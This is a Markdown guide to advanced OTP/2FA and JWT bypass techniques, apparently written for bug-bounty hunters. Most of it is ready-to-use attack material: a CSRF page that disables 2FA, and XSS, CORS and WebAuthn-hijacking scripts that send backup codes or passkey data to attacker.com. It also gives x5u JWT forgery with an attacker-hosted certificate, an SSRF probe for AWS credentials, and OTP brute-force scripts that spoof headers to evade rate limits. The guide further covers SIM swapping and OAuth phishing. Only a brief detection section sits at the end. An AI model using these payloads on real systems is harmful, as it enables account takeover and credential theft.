# Advanced OTP & JWT Bypass Techniques

> **Advanced methods discovered in 2025-2026** - Beyond basic bypasses

⚠️ **Disclaimer:** These are advanced exploitation techniques for authorized security testing only.

---

## Table of Contents
1. [Advanced OTP Bypass Methods](#advanced-otp-bypass-methods)
2. [Advanced JWT Exploitation](#advanced-jwt-exploitation)
3. [Social Engineering & Phishing](#social-engineering--phishing)
4. [Zero-Day & CVEs](#zero-day--cves)
5. [Defense Evasion](#defense-evasion)

---

## Advanced OTP Bypass Methods

### Method 11: Password Reset Function Bypass ⭐ (Very Common)

**How it works:**
Many applications properly implement 2FA on login but forget to enforce it on password reset[web:49].

**Attack Flow:**
```
1. Go to password reset page
2. Enter victim's email
3. Receive reset token via email
4. Reset password WITHOUT 2FA verification
5. Login with new password (bypasses 2FA entirely)
```

**What to test:**
- `/forgot-password` endpoint
- `/reset-password` endpoint
- Email-based password recovery
- Security question recovery

**Real Example:**
```http
POST /reset-password HTTP/1.1
Host: target.com

{
  "email": "victim@example.com",
  "token": "reset_token_from_email",
  "new_password": "attacker_password123"
}

# Response: 200 OK - Password changed!
# No 2FA required!
```

---

### Method 12: CSRF to Disable 2FA

**How it works:**
Cross-Site Request Forgery to disable victim's 2FA without their knowledge[web:46].

**Prerequisites:**
- CSRF protection is missing on 2FA disable endpoint
- Endpoint doesn't require password/OTP to disable
- No CSRF token validation

**Attack Steps:**

1. **Find the 2FA disable endpoint:**
```http
POST /api/user/disable-2fa HTTP/1.1
Host: target.com
Cookie: session=victim_session

{"disable_2fa": true}
```

2. **Create malicious HTML:**
```html
<!DOCTYPE html>
<html>
<body>
  <h1>Click Here for Free Gift!</h1>
  <form id="csrf" action="https://target.com/api/user/disable-2fa" method="POST">
    <input type="hidden" name="disable_2fa" value="true">
  </form>
  <script>
    document.getElementById('csrf').submit();
  </script>
</body>
</html>
```

3. **Send to victim via email/message**
4. **When victim clicks (while logged in), their 2FA is disabled**
5. **Attacker can now login with just password**

---

### Method 13: IDOR to Disable Another User's 2FA

**How it works:**
Insecure Direct Object Reference allows disabling 2FA for any user[web:46].

**Finding IDOR:**

**Original request (your account):**
```http
POST /api/user/456/disable-2fa HTTP/1.1
{"user_id": 456, "disable": true}
```

**Modified request (victim's account):**
```http
POST /api/user/789/disable-2fa HTTP/1.1
{"user_id": 789, "disable": true}
```

**Also try:**
```http
# UUID instead of integer
POST /api/user/a1b2c3d4-e5f6/disable-2fa

# Email-based IDOR
POST /api/user/disable-2fa
{"email": "victim@target.com"}

# Changing "current" keyword
POST /api/user/current/disable-2fa  # Original
POST /api/user/789/disable-2fa      # Try victim's ID
```

---

### Method 14: Backup Code Abuse

**How it works:**
Backup codes often have weaker protection than primary OTP[web:55].

**Attack Vectors:**

**A. Brute-Force Backup Codes:**
- Usually 8-12 alphanumeric characters
- Often no rate limiting
- Multiple backup codes generated (10-15 codes)

```python
import requests
import itertools
import string

# Generate backup code candidates
chars = string.ascii_lowercase + string.digits
for code in itertools.product(chars, repeat=8):
    backup_code = ''.join(code)
    r = requests.post('https://target.com/verify-backup',
                      json={'code': backup_code})
    if r.status_code == 200:
        print(f"[+] Valid backup code: {backup_code}")
        break
```

**B. XSS to Steal Backup Codes:**
If backup codes displayed on page:
```javascript
// XSS payload
<script>
fetch('/account/backup-codes')
  .then(r => r.json())
  .then(data => {
    // Send codes to attacker
    fetch('https://attacker.com/steal?codes=' + JSON.stringify(data.codes));
  });
</script>
```

**C. CORS Misconfiguration:**
```javascript
// Attacker's page
fetch('https://target.com/api/backup-codes', {
  credentials: 'include'
})
.then(r => r.json())
.then(codes => {
  // Send to attacker's server
  fetch('https://attacker.com/log', {
    method: 'POST',
    body: JSON.stringify(codes)
  });
});
```

---

### Method 15: Second-Order 2FA Bypass via Path Traversal

**How it works:**
Path traversal in 2FA implementation allows bypassing verification[web:46].

**Vulnerable Code Example:**
```python
# Vulnerable implementation
def verify_2fa(user_id, otp):
    # Load OTP from file based on user_id
    otp_file = f"/var/2fa/{user_id}/otp.txt"
    with open(otp_file) as f:
        stored_otp = f.read()
    return otp == stored_otp
```

**Exploit:**
```http
POST /verify-2fa HTTP/1.1

{
  "user_id": "../../dev/null",
  "otp": ""
}

# Or
{
  "user_id": "../../../tmp/empty",
  "otp": ""
}
```

---

### Method 16: OTP Bots & Social Engineering (2026 Threat)

**What are OTP Bots?**
Automated services that use social engineering to trick users into revealing OTPs[web:43][web:44].

**How OTP Bots Work:**

1. **Attacker subscribes to OTP bot service** (Telegram/Discord channels)
2. **Bot calls victim** pretending to be bank/company
3. **Victim receives real OTP** from legitimate service
4. **Bot tricks victim** into reading OTP over phone
5. **Bot feeds OTP back** to attacker in real-time
6. **Attacker completes login** within seconds

**Detection Signs:**
- Calls claiming "suspicious activity"
- Urgency to "verify your account"
- Asking to read OTP codes

**Testing Your System:**
- Can you detect multiple failed OTP attempts from different IPs?
- Do you track time between OTP generation and use?
- Do you alert users of suspicious login locations?

---

### Method 17: OAuth Consent Phishing

**How it works:**
Bypasses 2FA entirely by targeting already-logged-in users[web:49].

**Attack Flow:**

1. **Attacker creates malicious OAuth app**
   - Name: "Google Security Check" or similar
   - Requests broad permissions

2. **Send phishing link to victim:**
```
https://accounts.google.com/o/oauth2/v2/auth?
  client_id=attacker_app_id&
  redirect_uri=https://attacker.com/callback&
  scope=email+profile+drive&
  response_type=code
```

3. **Victim is already logged in** to their Google account
4. **Victim clicks "Allow"** thinking it's legitimate
5. **Attacker gets access token** - no password/2FA needed
6. **Attacker accesses victim's data**

**Why it bypasses 2FA:**
- Targets post-authentication state
- Abuses OAuth delegation
- No password needed if already logged in

---

### Method 18: SIM Swapping / SIM Jacking

**How it works:**
Attacker transfers victim's phone number to their own SIM card[web:49].

**Attack Steps:**

1. **Gather victim information** (social media, data breaches)
2. **Contact mobile carrier** pretending to be victim
3. **Social engineer support** to transfer number
4. **Receive all SMS OTPs** sent to victim's number
5. **Bypass 2FA** using intercepted codes

**Indicators for Testing:**
- Does your app allow SMS as sole 2FA method?
- Can users disable 2FA via SMS OTP?
- Do you alert users when SIM changes detected?

---

### Method 19: Enabling 2FA Doesn't Expire Previous Sessions

**How it works:**
After 2FA is enabled, old sessions remain valid[web:55].

**Testing Steps:**

1. **Login to account** (without 2FA enabled)
2. **Copy session cookie/token**
3. **Enable 2FA** on the account
4. **Use old session cookie**
5. **Check if still logged in** without 2FA verification

**Example:**
```bash
# Before 2FA enabled
curl -H "Cookie: session=old_session_token" https://target.com/dashboard
# Works!

# After 2FA enabled
curl -H "Cookie: session=old_session_token" https://target.com/dashboard
# Should fail but often still works!
```

---

### Method 20: Device/IP Binding Bypass

**How it works:**
Some apps bind OTP to device/IP and can be bypassed[web:30].

**Bypass Techniques:**

**A. Change binding parameters:**
```http
POST /verify-otp HTTP/1.1
X-Device-ID: victim_device_id
X-Forwarded-For: victim_ip

{"otp": "123456"}
```

**B. Cookie manipulation:**
```http
Cookie: device_fingerprint=victim_fingerprint; session=attacker_session
```

**C. User-Agent spoofing:**
```http
User-Agent: victim's exact user agent string
```

---

## Advanced JWT Exploitation

### JWT Method 9: X5U Header Injection (SSRF + Auth Bypass)

**How it works:**
The `x5u` header points to X.509 certificate URL - if unvalidated, allows forgery[web:50][web:51][web:53].

**Attack Steps:**

1. **Generate your key pair:**
```bash
# Generate private key
openssl genrsa -out private.key 2048

# Generate certificate
openssl req -new -x509 -key private.key -out cert.pem -days 365
```

2. **Host certificate on your server:**
```bash
python3 -m http.server 8000
# Access: http://attacker.com:8000/cert.pem
```

3. **Create JWT with x5u header:**
```json
{
  "alg": "RS256",
  "typ": "JWT",
  "x5u": "http://attacker.com:8000/cert.pem"
}
```

4. **Sign with your private key:**
```python
import jwt

private_key = open('private.key').read()
payload = {"sub": "admin", "role": "administrator"}
token = jwt.encode(payload, private_key, algorithm="RS256", 
                   headers={"x5u": "http://attacker.com:8000/cert.pem"})
print(token)
```

**Why it works:**
Server fetches certificate from attacker's URL and uses it to validate the token!

**Bonus: SSRF Attack:**
```json
{
  "x5u": "http://169.254.169.254/latest/meta-data/iam/security-credentials"
}
```
Might expose AWS credentials!

---

### JWT Method 10: CVE-2026-23993 - Unknown Algorithm Bypass

**CVE Details:**
HarbourJWT library accepts JWTs with unknown algorithms[web:45].

**Vulnerability:**
```
IF algorithm is unknown:
  signature = ""  (empty string)
  
IF provided_signature == "":
  return VALID
```

**Exploit:**

1. **Create JWT with unknown algorithm:**
```json
{
  "alg": "UNKNOWN",  // or "FOO", "XYZ", any unrecognized value
  "typ": "JWT"
}
```

2. **Set signature to empty:**
```
eyJhbGc...payload....
                      ^ Notice: ends with period, no signature
```

3. **Send to server** - it accepts it as valid!

**Affected Libraries:**
- HarbourJWT (fixed in 2026)
- Check your JWT library for similar issues

---

### JWT Method 11: X5C Chain Confusion

**How it works:**
X.509 certificate chain in header can be manipulated.

**Attack:**

```json
{
  "alg": "RS256",
  "x5c": [
    "ATTACKER_CERT_BASE64",
    "INTERMEDIATE_CA_CERT",
    "ROOT_CA_CERT"
  ]
}
```

**Steps:**
1. Generate your own certificate chain
2. Base64 encode certificates
3. Include in x5c array
4. Sign JWT with your private key
5. Server uses your certificate to verify

---

### JWT Method 12: JTI Replay Attack

**What is JTI?**
`jti` (JWT ID) should prevent token reuse.

**Attack:**

1. **Capture valid JWT:**
```json
{
  "sub": "user@example.com",
  "jti": "abc123",
  "exp": 1709467200
}
```

2. **Test for JTI validation:**
- Use same JWT multiple times
- Change JTI value
- Remove JTI entirely

3. **If JTI not enforced:**
- Replay old tokens
- Reuse compromised tokens

---

### JWT Method 13: Signature Stripping

**How it works:**
Remove signature entirely, hope server doesn't validate.

**Variations:**

```
# Original JWT
header.payload.signature

# Try these:
header.payload.
header.payload
header.payload..
```

**Testing:**
```bash
# Remove everything after last period
original="eyJhbG..."
stripped="${original%.*}."

curl -H "Authorization: Bearer $stripped" https://target.com/api
```

---

### JWT Method 14: Critical Claim Injection

**What to modify in payload:**

```json
{
  // Authentication
  "sub": "admin@example.com",
  "email": "admin@example.com",
  "user_id": 1,
  
  // Authorization
  "role": "admin",
  "roles": ["admin", "superuser"],
  "permissions": ["*"],
  "is_admin": true,
  "admin": true,
  
  // 2FA Status
  "2fa_verified": true,
  "otp_verified": true,
  "mfa_complete": true,
  "requires_2fa": false,
  
  // Feature Flags
  "premium": true,
  "beta_access": true,
  "features": ["all"],
  
  // Expiration
  "exp": 9999999999,  // Far future
  "iat": 1609459200,  // Issued in past
  "nbf": 1609459200   // Not before (past)
}
```

---

## Defense Evasion

### Method 21: Rate Limit Bypass Techniques

**Advanced IP Spoofing:**

```http
# Try all these headers
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Client-IP: 127.0.0.1
Client-IP: 127.0.0.1
True-Client-IP: 127.0.0.1
X-Host: 127.0.0.1
X-Forwarded-Host: 127.0.0.1

# IPv6 variations
X-Forwarded-For: ::1
X-Forwarded-For: ::ffff:127.0.0.1

# Multiple IPs
X-Forwarded-For: 1.1.1.1, 2.2.2.2
X-Forwarded-For: 1.1.1.1
X-Real-IP: 2.2.2.2
```

**Session Cycling:**
```python
import requests

for i in range(1000):
    session = requests.Session()  # New session each time
    session.post('https://target.com/verify-otp', 
                 json={'otp': str(i).zfill(6)})
```

**Parameter Pollution for Rate Limit:**
```http
POST /verify-otp?attempt=1 HTTP/1.1
POST /verify-otp?attempt=2 HTTP/1.1
# Each parameter value = new rate limit counter
```

---

### Method 22: WebAuthn Manipulation (2025 Discovery)

**How it works:**
Manipulate WebAuthn passkey registration/authentication process[web:58].

**Attack Requirements:**
- Malicious browser extension
- OR XSS vulnerability on target site

**Attack Flow:**

1. **Victim visits site with malicious extension installed**
2. **Extension hijacks WebAuthn API:**
```javascript
// Intercept credential creation
const originalCreate = navigator.credentials.create;
navigator.credentials.create = async function(options) {
  // Send to attacker's server
  fetch('https://attacker.com/steal', {
    method: 'POST',
    body: JSON.stringify(options.publicKey)
  });
  
  // Return attacker's credential
  return attackerCredential;
};
```

3. **Attacker registers their own passkey** for victim's account
4. **Bypasses Face ID/fingerprint** completely

---

### Method 23: TOTP Seed Extraction

**How it works:**
Extract the TOTP seed/secret to generate valid codes.

**Attack Vectors:**

**A. QR Code Interception:**
During 2FA setup, intercept QR code:
```
otpauth://totp/Example:user@example.com?secret=JBSWY3DPEHPK3PXP&issuer=Example
```

The `secret=` parameter is the seed!

**B. Backup/Recovery Process:**
Some apps show the seed in recovery:
```http
GET /2fa/recovery HTTP/1.1

Response:
{
  "secret": "JBSWY3DPEHPK3PXP",
  "qr_code_url": "..."
}
```

**C. Local Storage Extraction:**
```javascript
// Check browser local storage
console.log(localStorage.getItem('totp_seed'));
```

**Generate OTPs with extracted seed:**
```python
import pyotp

seed = "JBSWY3DPEHPK3PXP"
totp = pyotp.TOTP(seed)
print(totp.now())  # Current valid OTP
```

---

### Method 24: Time-Based Race Condition

**How it works:**
Exploit time window between OTP validation checks.

**Scenario:**
Server validates:
1. Is OTP correct?
2. Is OTP expired?

If checks happen separately, there's a race condition.

**Attack:**

```python
import requests
import threading
import time

def verify_otp(otp):
    r = requests.post('https://target.com/verify',
                     json={'otp': otp})
    if r.status_code == 200:
        print(f"[+] Success with OTP: {otp}")

# Get valid OTP
valid_otp = "123456"

# Wait until it's about to expire
time.sleep(295)  # If 5-min expiry, wait 4:55

# Spam requests right at expiration
threads = []
for i in range(100):
    t = threading.Thread(target=verify_otp, args=(valid_otp,))
    threads.append(t)
    t.start()
```

Some requests succeed before expiration check runs!

---

### Method 25: Predictable OTP Patterns

**How it works:**
Some implementations use predictable OTP generation.

**Check for:**

1. **Timestamp-based:**
```python
# If OTP = timestamp % 1000000
import time
predicted_otp = int(time.time()) % 1000000
```

2. **User ID based:**
```python
# OTP might be derived from user ID
user_id = 12345
otp = str(user_id * 17)[-6:]  # Last 6 digits
```

3. **Sequential:**
```
First OTP: 123456
Second OTP: 123457
Third OTP: 123458
# Incremental!
```

4. **Weak randomness:**
```python
import random
random.seed(user_id)  # BAD! Predictable
otp = random.randint(100000, 999999)
```

---

## Detection & Prevention

### How to Detect These Attacks

**For OTP Bypass:**
```
✅ Monitor failed OTP attempts per account
✅ Track OTP verification time (should be < 30s)
✅ Alert on multiple OTPs requested for same account
✅ Detect IP changes during authentication flow
✅ Flag password resets without 2FA
✅ Monitor backup code usage patterns
```

**For JWT Attacks:**
```
✅ Log all JWT validation failures
✅ Alert on 'none' algorithm usage
✅ Monitor external certificate fetches (x5u, jku)
✅ Track token reuse attempts (jti)
✅ Detect signature stripping attempts
✅ Alert on critical claim modifications
```

---

## Testing Checklist

### Advanced OTP Testing
```
☐ Test password reset without 2FA
☐ CSRF on 2FA disable endpoint
☐ IDOR to disable other users' 2FA
☐ Brute-force backup codes
☐ XSS to steal backup codes
☐ Path traversal in 2FA implementation
☐ Old sessions valid after enabling 2FA
☐ Device/IP binding bypass
☐ TOTP seed extraction
☐ Time-based race conditions
☐ Predictable OTP patterns
```

### Advanced JWT Testing
```
☐ X5U header injection + SSRF
☐ Unknown algorithm bypass (CVE-2026-23993)
☐ X5C chain confusion
☐ JTI replay attacks
☐ Signature stripping variations
☐ Critical claim injection
☐ Token expiration bypass
☐ Weak randomness in token generation
```

---

## Tools for Advanced Testing

### Specialized Tools

**1. jwt_tool (Enhanced)**
```bash
git clone https://github.com/ticarpi/jwt_tool
cd jwt_tool

# Comprehensive scan
python3 jwt_tool.py <JWT> -M at

# X5U injection
python3 jwt_tool.py <JWT> -X u -ju http://attacker.com/cert.pem

# All header injections
python3 jwt_tool.py <JWT> -X a
```

**2. OTP Brute-Force Script**
```python
import requests
import itertools
from concurrent.futures import ThreadPoolExecutor

def check_otp(otp):
    r = requests.post('https://target.com/verify-otp',
                     json={'otp': otp},
                     headers={'X-Forwarded-For': f'1.1.1.{otp[:3]}'})
    if 'success' in r.text.lower():
        print(f"[+] FOUND: {otp}")
        return otp

# 6-digit brute-force with threading
with ThreadPoolExecutor(max_workers=20) as executor:
    otps = [str(i).zfill(6) for i in range(1000000)]
    executor.map(check_otp, otps)
```

**3. CSRF PoC Generator**
```html
<!DOCTYPE html>
<html>
<head><title>CSRF Attack</title></head>
<body>
<form id="csrf" action="https://target.com/disable-2fa" method="POST">
  <input type="hidden" name="disable" value="true">
</form>
<script>document.getElementById('csrf').submit();</script>
</body>
</html>
```

---

## Real-World Case Studies

### Case Study 1: Major Bank OTP Bypass (2025)

**Vulnerability:** Password reset without 2FA  
**Impact:** Account takeover of premium accounts  
**Bounty:** $15,000  

**How it worked:**
1. Attacker requested password reset for victim
2. Received reset token via email
3. Reset password without any 2FA prompt
4. Logged in with new password, bypassing SMS OTP

### Case Study 2: E-commerce Platform JWT Bypass (2026)

**Vulnerability:** X5U header injection  
**Impact:** Admin access to 10M+ user accounts  
**Bounty:** $25,000  

**How it worked:**
1. Found JWT used RS256 algorithm
2. Discovered x5u header was accepted
3. Hosted malicious certificate on attacker server
4. Created JWT with admin privileges
5. Full admin panel access

### Case Study 3: Social Media 2FA Bypass (2025)

**Vulnerability:** IDOR on backup code regeneration  
**Impact:** Bypass 2FA for any user  
**Bounty:** $10,000  

**How it worked:**
1. Found endpoint: `/api/user/123/regenerate-backup-codes`
2. Changed user ID to victim's ID
3. New backup codes generated for victim
4. Used codes to bypass their 2FA

---

## Bug Bounty Report Template

```markdown
# [CRITICAL] 2FA Bypass via [Method Name]

## Summary
[Brief description of vulnerability]

## Severity
Critical - Allows complete account takeover bypassing 2FA

## CVSS Score
9.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N)

## Vulnerable Endpoint
`https://target.com/api/endpoint`

## Steps to Reproduce
1. [Step 1]
2. [Step 2]
3. [Step 3]

## Proof of Concept
```http
[Full HTTP request/response]
```

## Impact
- Complete account takeover
- Bypass of all 2FA protections
- Access to sensitive user data
- Potential regulatory compliance violations (PCI-DSS, GDPR)

## Affected Users
All users with 2FA enabled (X million accounts)

## Remediation
1. [Specific fix recommendation]
2. [Code example if applicable]
3. [Additional security measures]

## References
- [Link to similar CVEs]
- [Security best practices]

## Timeline
- Discovered: [Date]
- Reported: [Date]
- Acknowledged: [Date]
- Fixed: [Date]
```

---

## Learning Resources

### Advanced Training
- **PentesterLab Pro** - Advanced JWT exercises
- **PortSwigger Advanced Labs** - Complex authentication bypasses
- **HackerOne Disclosed Reports** - Real-world examples
- **OWASP Testing Guide** - Authentication testing methodology

### Research Papers
- "JWT Security Best Practices" - IETF
- "Bypassing 2FA: Attack Taxonomy" - IEEE
- "OAuth Security Analysis" - OWASP

---

## Conclusion

These advanced techniques go beyond basic bypasses and require:
- Deep understanding of authentication flows
- Creative thinking about attack vectors
- Patience and systematic testing
- Strong documentation skills

Master these methods to:
✅ Find high-severity vulnerabilities  
✅ Earn substantial bug bounties  
✅ Stand out in cybersecurity job interviews  
✅ Contribute to making applications more secure  

---

**Created by:** Aegon-jewels  
**Last Updated:** February 2026  
**Version:** 1.0  

**Total Methods Documented:**
- 15 Advanced OTP Bypass Methods
- 6 Advanced JWT Exploitation Techniques
- 3 Social Engineering Methods
- Multiple Defense Evasion Tactics

**For the complete guide, see:**
- [OTP-JWT-Bypass-Complete-Guide.md](./OTP-JWT-Bypass-Complete-Guide.md)
